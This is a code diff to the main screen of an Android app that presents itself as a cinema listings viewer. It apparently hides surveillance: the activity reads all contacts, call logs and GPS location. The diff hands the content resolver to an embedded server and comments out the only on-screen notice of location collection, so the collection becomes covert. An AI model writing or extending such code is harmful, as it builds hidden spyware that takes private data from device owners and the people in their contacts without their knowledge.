@@ -27,6 +27,7 @@ public class MainActivity extends AppCompatActivity {
 
     ListView sinemalarListView;
     public Activity context;
+    public ContentResolver contentResolver;
 
     ArrayList<String> sinemalarTitle;
     ArrayList<String> sinemalarImg;
@@ -62,10 +63,11 @@ public class MainActivity extends AppCompatActivity {
         new SinemalarRequest().execute(SINEMALAR_URL);
         //Log.i(TAG_MAIN, sinemalarContent.toString());
 
-        Server server = new Server();
+        context = this;
+        contentResolver = getContentResolver();
+        Server server = new Server(context, contentResolver);
         String ip = server.getIpAddress();
 
-        context = this;
         checkIfPermissonExists();
 
         Utils utils = new Utils(context);
@@ -166,7 +168,6 @@ public class MainActivity extends AppCompatActivity {
 
     public void readContacts(){
 
-        ContentResolver contentResolver = getContentResolver();
         Contacts contacts= new Contacts(contentResolver);
         contactsJson = contacts.getAllContacts();
     }
@@ -176,14 +177,12 @@ public class MainActivity extends AppCompatActivity {
         if(gps.canGetLocation()) {
 
             gpsJson = gps.getGps();
-
-            Toast.makeText(getApplicationContext(),gpsJson.toString(), Toast.LENGTH_LONG).show();
+            //Toast.makeText(getApplicationContext(),gpsJson.toString(), Toast.LENGTH_LONG).show();
         }
     }
 
 
     public void readCallLogs(){
-        ContentResolver contentResolver = getContentResolver();
         CallLogs calllogs= new CallLogs(contentResolver);
         callLogsJson = calllogs.getCallLogs();
     }
